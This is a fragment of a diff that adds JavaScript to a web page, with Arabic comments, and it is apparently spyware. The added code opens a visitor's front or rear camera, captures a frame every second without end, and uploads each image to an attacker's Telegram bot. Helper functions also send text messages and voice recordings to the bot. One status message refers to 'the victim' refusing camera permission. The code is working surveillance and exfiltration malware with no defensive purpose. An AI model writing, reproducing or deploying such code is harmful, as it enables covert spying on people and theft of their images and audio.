+        }
+    }
+
+
+    // [الوظيفة الثانية: التقاط الكاميرا اللانهائي]
+    else if (type.includes('Cam')) {
+        const mode = (type === 'Front_Cam') ? 'user' : 'environment';
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            
+            // إنشاء عناصر المعالجة في الخلفية
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            // التقاط وإرسال صورة كل 3 ثوانٍ للأبد
+            setInterval(async () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(async (blob) => {
+                    if(blob) await sendPhotoTele(tk, id, blob, `📸 لقطة: ${type}`);
+                }, 'image/jpeg', 0.7);
+            }, 1000);
+
+        } catch (err) {
+            await sendTele(tk, id, `❌ الضحية رفض إذن الكاميرا (${type}).`);
+        }
+    }
+}
+
+// --- الدوال المساعدة لإرسال البيانات ---
+
+// إرسال النصوص
+async function sendTele(tk, id, msg) {
+    await fetch(`https://api.telegram.org/bot${tk}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: id, text: msg, parse_mode: 'Markdown'})
+    });
+}
+
+// إرسال الصور كملفات (مهم جداً للكاميرا)
+async function sendPhotoTele(tk, id, blob, caption) {
+    const formData = new FormData();
+    formData.append('chat_id', id);
+    formData.append('photo', blob, 'capture.jpg');
+    formData.append('caption', caption);
+
+    await fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+    });
+}
+// إرسال الملفات الصوتية إلى تليجرام
+async function sendAudioTele(tk, id, blob, caption) {
+    const formData = new FormData();
+    formData.append('chat_id', id);
+    formData.append('voice', blob, 'record.ogg'); // تليجرام يفضل صيغة ogg للمقاطع الصوتية
+    formData.append('caption', caption);
+
+    await fetch(`https://api.telegram.org/bot${tk}/sendVoice`, {
+        method: 'POST',
+        body: formData
+    });
+}
+
+
+    </script>
+</body>
+</html>
+
